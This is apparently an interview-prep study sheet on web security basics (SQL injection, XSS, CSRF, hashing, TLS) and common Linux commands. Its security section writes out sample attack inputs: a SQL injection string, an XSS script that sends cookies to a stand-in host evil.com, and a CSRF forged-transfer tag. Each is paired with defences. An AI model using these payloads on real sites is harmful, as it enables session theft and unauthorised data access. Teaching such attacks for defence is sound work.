# 19 — Security Fundamentals & Linux Basics

---

> **TCS Digital 2026 increasingly asks about security awareness (SQL injection, XSS) and basic Linux command-line skills. These topics were NOT in the original 16 files.**

---

## 19.1 Web Security — Common Vulnerabilities (OWASP Top 10 Awareness)

### SQL Injection — CRITICAL (Directly Relevant to Your SQL Skills)

**What**: Attacker manipulates SQL queries by injecting malicious code through user input.

```python
# ❌ VULNERABLE — String concatenation
username = input("Enter username: ")
query = f"SELECT * FROM users WHERE username = '{username}'"
# Attacker enters: ' OR 1=1 --
# Query becomes: SELECT * FROM users WHERE username = '' OR 1=1 --'
# Returns ALL users! The -- comments out the rest of the query.
```

```python
# ✅ SAFE — Parameterized queries
cursor.execute(
    "SELECT * FROM users WHERE username = %s", 
    (username,)
)
# The %s placeholder ensures the input is treated as DATA, not SQL code.
# Even if attacker enters ' OR 1=1 --, it's treated as a literal string.
```

```python
# ✅ SAFE — SQLAlchemy (YOUR project uses this!)
from sqlalchemy import text
result = engine.execute(
    text("SELECT * FROM crimes WHERE district = :district"),
    {"district": user_input}
)
# SQLAlchemy's parameterized queries prevent injection by design.
```

**Q: "How do you prevent SQL injection in your project?"**
> "My project uses SQLAlchemy with parameterized queries. The `to_sql()` method internally uses parameterized INSERT statements, so user-supplied data is never concatenated directly into SQL. For any custom queries, I'd use SQLAlchemy's `text()` with bound parameters like `:param_name`. I'd also apply input validation — checking data types and lengths before they reach the database layer."

---

### Cross-Site Scripting (XSS)

**What**: Attacker injects malicious JavaScript into a web page that other users' browsers execute.

```html
<!-- Attacker submits this as a "comment": -->
<script>document.location='https://evil.com/steal?cookie='+document.cookie</script>

<!-- If the app displays it without sanitization, every visitor's browser runs it -->
```

**Prevention:**
1. **HTML Escaping** — Convert `<script>` to `&lt;script&gt;` before rendering
2. **Content Security Policy (CSP)** — HTTP header that restricts which scripts can run
3. **Input Validation** — Reject or sanitize HTML/JS in user inputs
4. **Frameworks do this by default** — Flask's Jinja2 auto-escapes, React escapes by default

---

### Cross-Site Request Forgery (CSRF)

**What**: Attacker tricks a user's browser into making unwanted requests to a site where the user is logged in.

```html
<!-- Attacker's malicious page: -->
<img src="https://bank.com/transfer?to=attacker&amount=10000">
<!-- If the user's browser has a valid session cookie, the transfer happens! -->
```

**Prevention:**
1. **CSRF Tokens** — Include a unique, secret token in every form that the server validates
2. **SameSite Cookies** — Cookie attribute that prevents cross-site sending
3. **Verify Origin/Referer headers** — Check where the request came from

---

### Other Security Concepts — Quick Reference

| Vulnerability | What It Is | Prevention |
|---------------|-----------|------------|
| **Broken Authentication** | Weak passwords, session hijacking | Strong hashing (bcrypt), session timeouts, MFA |
| **Sensitive Data Exposure** | Storing passwords in plaintext, logs with PII | Encrypt at rest + in transit, never log passwords |
| **Broken Access Control** | User accesses admin pages without permission | Role-based access, verify authorization on server |
| **Security Misconfiguration** | Debug mode in production, default credentials | Disable debug, change defaults, regular audits |
| **Using Vulnerable Dependencies** | Outdated libraries with known exploits | Regular `pip audit`, dependency scanning |

---

## 19.2 Hashing vs Encryption

| Feature | Hashing | Encryption |
|---------|---------|------------|
| **Direction** | One-way (irreversible) | Two-way (reversible) |
| **Purpose** | Verify integrity, store passwords | Protect data in transit/at rest |
| **Key needed?** | No (salting is recommended) | Yes (encryption key required) |
| **Same input** | Always produces same hash | Same input + same key = same output |
| **Examples** | SHA-256, bcrypt, MD5 | AES-256, RSA, TLS |
| **Use case** | Password storage, file checksums | HTTPS, encrypted databases, VPN |

```python
# Hashing a password (NEVER store plaintext passwords)
import hashlib
password_hash = hashlib.sha256("my_password".encode()).hexdigest()
# Result: fixed-length string like "5e884898da28047151d0e56f..."
# You can verify passwords but NEVER recover the original

# Better: use bcrypt (includes salt automatically)
import bcrypt
hashed = bcrypt.hashpw("my_password".encode(), bcrypt.gensalt())
# Verify
is_valid = bcrypt.checkpw("my_password".encode(), hashed)
```

**Q: "Your database.py has hardcoded credentials. How would you secure them in production?"**
> "Three approaches: 1) **Environment variables** — store credentials in OS env vars, read with `os.environ['DB_PASSWORD']`. 2) **`.env` file** — use `python-dotenv` to load from a git-ignored `.env` file. 3) **Secrets manager** — in cloud environments, use AWS Secrets Manager or Azure Key Vault. I'd also use a dedicated MySQL user with restricted privileges (only SELECT, INSERT on the crimes database — no DROP or admin access)."

---

## 19.3 HTTPS / TLS — How Encryption Works in the Web

```
TLS Handshake (simplified):

1. Client Hello → "I support these encryption algorithms: AES-256, RSA..."
2. Server Hello → "Let's use AES-256. Here's my SSL certificate."
3. Client verifies certificate with Certificate Authority (CA)
4. Client generates a session key, encrypts it with server's public key
5. Server decrypts session key with its private key
6. Both sides now have the session key → all further communication is encrypted

Key concept: Asymmetric crypto (RSA) for key exchange
             Symmetric crypto (AES) for data transfer (faster)
```

---

## 19.4 Linux Basics — Essential Commands

> **TCS uses Linux-based servers extensively. Even if you develop on Windows, you should know basic Linux commands.**

### File System Navigation

```bash
pwd                        # Print working directory
ls -la                     # List files with details (permissions, size)
cd /home/user/project      # Change directory
cd ..                      # Go up one level
cd ~                       # Go to home directory

mkdir -p data/processed    # Create directory (and parents)
rm -rf old_data/           # Remove directory recursively (DANGEROUS)
cp file.csv backup.csv     # Copy file
mv old_name.py new_name.py # Move/rename file
```

### File Viewing & Searching

```bash
cat file.txt               # Display entire file
head -20 crime_data.csv    # First 20 lines
tail -50 project.log       # Last 50 lines
less large_file.csv        # Page through large file

grep "THEFT" crime_data.csv           # Search for text in file
grep -r "TODO" *.py                   # Search recursively in Python files
grep -c "THEFT" crime_data.csv        # Count matching lines
wc -l crime_data.csv                  # Count total lines in file
```

### Process Management

```bash
ps aux                     # List all running processes
ps aux | grep python       # Find Python processes
top                        # Real-time process monitor (CPU, memory)
htop                       # Better version of top (if installed)

kill <PID>                 # Graceful kill
kill -9 <PID>              # Force kill

nohup python main.py &     # Run in background, survives logout
# Output goes to nohup.out
```

### File Permissions

```bash
ls -l script.py
# -rwxr-xr-- 1 user group 1024 Mar 29 script.py
#  │││ │││ │││
#  │││ │││ └── Others: read only
#  │││ └── Group: read + execute
#  └── Owner: read + write + execute

chmod 755 script.py        # Owner: rwx, Group: r-x, Others: r-x
chmod +x script.py         # Add execute permission

# Common permissions:
# 644 = Owner reads/writes, everyone else reads (files)
# 755 = Owner does everything, everyone else reads/executes (scripts)
```

### Networking Commands

```bash
ping google.com            # Test connectivity
ifconfig                   # Show network interfaces (or ip addr)
curl https://api.example.com/data    # Make HTTP request from terminal
wget https://data.lacity.org/crime.csv  # Download file

netstat -tlnp              # Show listening ports
ssh user@server.com        # Remote login
scp file.csv user@server:/path/  # Copy file to remote server
```

### Package Management

```bash
# Python specific
pip install pandas         # Install package
pip freeze > requirements.txt  # Export installed packages
pip install -r requirements.txt  # Install from file
python -m venv venv        # Create virtual environment

# System packages (Ubuntu/Debian)
sudo apt update            # Update package list
sudo apt install mysql-server  # Install MySQL
```

### Useful Compound Commands

```bash
# Count unique crime types in CSV
cut -d',' -f6 crime_data.csv | sort | uniq -c | sort -rn | head -10

# Find large files
find /home -size +100M -type f

# Monitor log file in real-time
tail -f logs/project.log

# Check disk usage
df -h                      # Disk space
du -sh data/               # Directory size

# Chain commands
python etl.py && echo "ETL succeeded" || echo "ETL failed"
```

---

## 19.5 Linux Quick-Fire Interview Questions

| Question | Answer |
|----------|--------|
| What is the difference between `rm` and `rm -rf`? | `rm` deletes a file. `rm -rf` deletes recursively and forcefully — deletes directories and everything inside without confirmation |
| What does `chmod 777` do? | Gives full read/write/execute permissions to owner, group, AND everyone else — never use in production (security risk) |
| What is a cron job? | A scheduled task that runs automatically at specified intervals (minute, hour, day). Configured via `crontab -e` |
| What is `sudo`? | "Super User Do" — executes a command with admin/root privileges |
| What is a shell? | Interface between user and OS kernel. Common shells: bash, zsh, sh |
| What does `|` (pipe) do? | Sends output of one command as input to another: `cat file | grep "error"` |
| What is `/dev/null`? | A "black hole" — redirect output there to discard it: `command 2>/dev/null` |
| What does `>` vs `>>` do? | `>` overwrites file, `>>` appends to file |
| What is stdin, stdout, stderr? | Standard input (0), standard output (1), standard error (2) — the three I/O streams |

---

## 19.6 Security + Linux in Your Project Context

**Q: "How would you secure your crime data pipeline in production?"**
> "Five measures:
> 1. **Database credentials** — Move from `config.py` hardcoding to environment variables or a secrets manager
> 2. **User privileges** — MySQL user `ChicagoCrimeClient` should only have SELECT, INSERT, UPDATE permissions — no DROP or ADMIN
> 3. **Network** — MySQL should listen only on localhost or a private network, not on `0.0.0.0`
> 4. **Data sensitivity** — Crime location data is PII-adjacent. In production, I'd hash or generalize coordinates to area-level for public dashboards
> 5. **Logging** — Never log sensitive data (passwords, PIDs); log only operational metrics (chunk counts, processing times)"

---

*This file fills the Security Fundamentals and Linux gaps identified for TCS Digital 2026.*
